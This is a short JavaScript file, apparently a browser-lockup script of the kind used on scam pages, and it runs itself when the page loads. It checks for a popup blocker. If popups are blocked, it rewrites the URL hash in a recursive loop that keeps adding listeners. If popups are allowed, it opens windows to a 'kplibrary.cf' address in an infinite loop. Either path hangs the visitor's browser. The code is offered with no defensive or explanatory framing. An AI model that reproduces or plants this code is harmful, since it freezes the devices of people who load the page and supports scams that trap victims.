function recursor() {
  //Change hash of current URL
  window.location.hash = Math.random();
  //Recurse on hash changes
  window.addEventListener('hashchange', function() {
    recursor();
  });
};

function detectPopupBlocker() {
  var myTest = window.open("about:blank", "", "directories=no,height=100,width=100,menubar=no,resizable=no,scrollbars=no,status=no,titlebar=no,top=0,location=no");
  if (!myTest) {
    setTimeout(function() {
      recursor();
    }, 500);

  } else {
    myTest.close();
    while (true) {
      var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
      var URL = "kplibrary.cf" + location.href;
      var win = window.open(URL, "_blank", strWindowFeatures);
    }
  }
}
detectPopupBlocker();
